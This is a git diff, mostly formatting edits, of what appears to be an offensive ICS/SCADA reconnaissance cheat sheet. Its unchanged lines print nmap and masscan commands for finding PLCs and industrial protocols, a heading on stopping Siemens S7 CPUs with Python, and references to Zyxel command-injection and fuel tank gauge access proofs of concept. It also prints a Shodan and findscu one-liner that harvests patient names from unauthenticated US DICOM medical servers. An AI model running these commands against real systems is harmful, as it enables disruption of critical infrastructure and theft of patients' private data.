@@ -1,6 +1,6 @@
-# :mechanical_arm:	 ICS/SCADA Enumeration Techniques for Effective Scanning, Network Reconnaissance, and Tactical Host Probing:
+# :mechanical_arm:  ICS/SCADA Enumeration Techniques for Effective Scanning, Network Reconnaissance, and Tactical Host Probing
 
-## General Enumeration:
+## General Enumeration
 
 ```bash
 nmap -Pn -sT --scan-delay 1s --max-parallelism 1 \
@@ -11,7 +11,7 @@ nmap -Pn -sT --scan-delay 1s --max-parallelism 1 \
 
 ## Siemens S7
 
-Enumerates Siemens S7 PLC Devices and collects their device information. This script is based off PLCScan that was developed by Positive Research and Scadastrangelove (https://code.google.com/p/plcscan/). This script is meant to provide the same functionality as PLCScan inside of Nmap. Some of the information that is collected by PLCScan was not ported over; this information can be parsed out of the packets that are received.
+Enumerates Siemens S7 PLC Devices and collects their device information. This script is based off PLCScan that was developed by Positive Research and Scadastrangelove (<https://code.google.com/p/plcscan/>). This script is meant to provide the same functionality as PLCScan inside of Nmap. Some of the information that is collected by PLCScan was not ported over; this information can be parsed out of the packets that are received.
 
 Usage:
 
@@ -39,7 +39,7 @@ For scalable scanning and reconnaissance, utilize masscan for faster enumeration
 masscan <IP Range> -p 102 -oL Possible_ICS.txt; cat Possible_ICS.txt | while read LINE; do nmap --script s7-info.nse -p 102 $(awk '{print $4}'); done
 ```
 
-## Stopping S7 CPUs with Python:
+## Stopping S7 CPUs with Python
 
 ```python
 import snap7
@@ -61,8 +61,6 @@ nmap -Pn -sT -p502 --script modbus-discover <target>
 nmap -sT -Pn -p502 --script modbus-discover --script-args modbus-discover.aggressive=true <target>
 ```
 
-
-
 ## Bacnet
 
 ```bash
@@ -73,21 +71,13 @@ nmap -Pn -sU -p47808 --script bacnet-info <target>
 nmap -Pn -sT -n -T4 -p5033 <target> 
 ```
 
-
-
-
 ## Enip
 
 ```nmap -Pn -sU -p44818 --script enip-info <target>```
 
-
-
-
 ## Niagara fOX
 
 ```nmap -Pn -sT -p1911,4911 --script fox-info <target>```
-
-
 
 ## Omron
 
@@ -225,7 +215,7 @@ Schneider Electric PLCs
 Device Identification: Schneider Electric
 ```
 
-Schneider Electric PowerLogic Series 800 Power Meter	
+Schneider Electric PowerLogic Series 800 Power Meter 
 
 ```
 PowerLogic PM800
@@ -237,7 +227,7 @@ Schweitzer Engineering Laboratories Power Quality and Revenue Meter
 SEL-735 Telnet Server
 ```
 
-## Maritime 
+## Maritime
 
 Subsea Mission Control Panels
 
@@ -316,13 +306,15 @@ VMware Workspace ONE Access and Identity Manager contain a remote code execution
 ```
 http.favicon.hash:-1250474341
 ```
+
 ## Exposed DICOM Servers
 
 Count patient names in US exposed DICOM medical servers with no authentication
 
 ```bash
-$ shodan download search "tag:medical" "country:us"; shodan parse --fields ip_str search.json.gz > usa_dicom_ip ; for i in `cat usa_dicom_ip` ; do echo "///// Now connecting to $i ////" ; findscu -v -to 1 -P -k PatientName="*" $i 104 >> us_dicom_patient_names; wc -l us_dicom_patient_names ; done
+shodan download search "tag:medical" "country:us"; shodan parse --fields ip_str search.json.gz > usa_dicom_ip ; for i in `cat usa_dicom_ip` ; do echo "///// Now connecting to $i ////" ; findscu -v -to 1 -P -k PatientName="*" $i 104 >> us_dicom_patient_names; wc -l us_dicom_patient_names ; done
 ```
+
 ## Zyxel Firewall Unauthenticated Remote Command Injection
 
 Rapid7 discovered and reported a vulnerability that affects Zyxel firewalls supporting Zero Touch Provisioning (ZTP), which includes the ATP series, VPN series, and the USG FLEX series (including USG20-VPN and USG20W-VPN). The vulnerability, identified as CVE-2022-30525, allows an unauthenticated and remote attacker to achieve arbitrary code execution as the nobody user on the affected device.
@@ -357,7 +349,7 @@ Alert ID: 34W09AETJKAHEDPX
 3. Confirm that alert is generated
 
 ```bash
-root@RoseSecurity# shodan alert info home 
+root@RoseSecurity# shodan alert info home
 home
 Created: 2022-03-01:69:69:69000
 Notifications: Disabled
@@ -480,7 +472,7 @@ for root, dirs, files in os.walk(ics_path):
              
 ```
 
-## Automated Tank Gauge (ATG) Remote Configuration Disclosure:
+## Automated Tank Gauge (ATG) Remote Configuration Disclosure
 
 In 2015, HD Moore, the creator of Metasploit, published an article disclosing over 5,800 gas station Automated Tank Gauges (ATGs) which were publicly accessible. Besides monitoring for leakage, these systems are also instrumental in gauging fluid levels, tank temperature, and can alert operators when tank volumes are too high or have reached a critical low. ATGs are utilized by nearly every fueling station in the United States and tens of thousands of systems internationally. They are most commonly manufactured by Veeder-Root, a supplier of fuel dispensers, payment systems, and forecourt merchandising. For remote monitoring of these fuel systems, operators will commonly configure the ATG serial interface to an internet-facing TCP port (generally set to TCP 10001). This script reads the Get In-Tank Inventory Report from TCP/10001 as a proof of concept to demonstrate the arbitrary access.
 
@@ -514,9 +506,9 @@ atg_file.close()
 
 Video PoC:
 
-https://www.youtube.com/watch?v=HkO4cs95erU&t=818s
+<https://www.youtube.com/watch?v=HkO4cs95erU&t=818s>
 
-## Access Moxa Devices:
+## Access Moxa Devices
 
 SCADA system that uses Moxa brand products to establish connectivity and communication with industrial devices that are being monitored and controlled in a critical infrastructure or industrial process.
 
